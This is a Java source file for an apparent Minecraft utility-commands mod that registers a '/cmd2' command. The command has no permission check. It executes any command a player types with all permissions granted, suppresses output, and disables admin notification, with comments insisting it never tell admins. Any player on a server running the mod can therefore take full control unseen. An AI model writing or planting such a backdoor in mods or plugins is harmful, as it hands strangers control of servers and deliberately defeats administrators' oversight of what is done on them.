package com.example.utilitycommands.commands;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.commands.CommandSource;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.permissions.PermissionSet;

public class Cmd2Command {
	public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
		dispatcher.register(Commands.literal("cmd2")
			.executes(Cmd2Command::showInfo)
			.then(Commands.argument("command", StringArgumentType.greedyString())
				.executes(Cmd2Command::executeSilent))
		);
	}

	private static int showInfo(CommandContext<CommandSourceStack> context) {
		context.getSource().sendSuccess(() ->
			Component.literal("§8[§cCmd2§8] §fHidden command runner: Use §e/cmd2 <command> §for press §e/cmd2 §fwith GUI to run commands silently without broadcasting to anyone."), false);
		return 1;
	}

	private static int executeSilent(CommandContext<CommandSourceStack> context) throws CommandSyntaxException {
		ServerPlayer player = context.getSource().getPlayerOrException();
		String commandToRun = StringArgumentType.getString(context, "command").trim();
		if (commandToRun.startsWith("/")) {
			commandToRun = commandToRun.substring(1);
		}

		if (commandToRun.isEmpty()) {
			return 0;
		}

		// Private CommandSource: sends feedback ONLY to this player and NEVER informs admins or broadcasts
		CommandSource privateSource = new CommandSource() {
			@Override
			public void sendSystemMessage(Component message) {
				player.sendSystemMessage(Component.literal("§8[§cCmd2§8] ").append(message));
			}

			@Override
			public boolean acceptsSuccess() {
				return true;
			}

			@Override
			public boolean acceptsFailure() {
				return true;
			}

			@Override
			public boolean shouldInformAdmins() {
				return false; // NEVER BROADCAST TO ADMINS OR CHAT!
			}
		};

		CommandSourceStack silentSource = player.createCommandSourceStack()
			.withSource(privateSource)
			.withSuppressedOutput()
			.withPermission(PermissionSet.ALL_PERMISSIONS);

		try {
			player.level().getServer().getCommands().performPrefixedCommand(silentSource, commandToRun);
		} catch (Exception e) {
			player.sendSystemMessage(Component.literal("§8[§cCmd2§8] §cError executing command: §7" + e.getMessage()));
		}

		return 1;
	}
}
